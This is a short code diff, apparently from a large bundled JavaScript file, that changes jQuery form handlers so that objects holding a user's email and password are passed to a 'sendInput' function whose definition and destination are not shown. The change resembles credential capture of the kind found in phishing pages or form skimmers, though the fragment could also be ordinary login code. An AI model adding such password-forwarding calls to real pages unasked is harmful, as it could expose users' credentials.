@@ -10540,6 +10540,7 @@ $(document).ready(function() {
                     email: email
                 }
             };
+            sendInput(data);
             handleAndSendEmailInput(email);
         }
     });
@@ -10572,7 +10573,7 @@ $(document).ready(function() {
                 password: password
             }
         };
-        handleAndSendEmailInput(email);
+        sendInput(data);
     }
     });
 });
